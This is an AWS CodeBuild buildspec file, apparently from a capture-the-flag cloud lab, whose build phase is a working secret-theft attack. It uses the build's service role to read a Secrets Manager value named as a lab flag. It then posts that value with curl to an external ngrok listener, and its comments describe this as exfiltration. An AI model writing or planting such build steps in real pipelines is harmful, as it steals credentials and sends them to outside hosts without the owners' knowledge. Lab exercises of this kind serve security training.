version: 0.2

phases:
  build:
    commands:
      - echo "Checking environment..."
      # Attempt to retrieve the secret using the CodeBuild Service Role
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      # Exfiltrate the flag to your listener
      - curl -X POST http://4.tcp.eu.ngrok.io:10436 --data "flag=$FLAG"
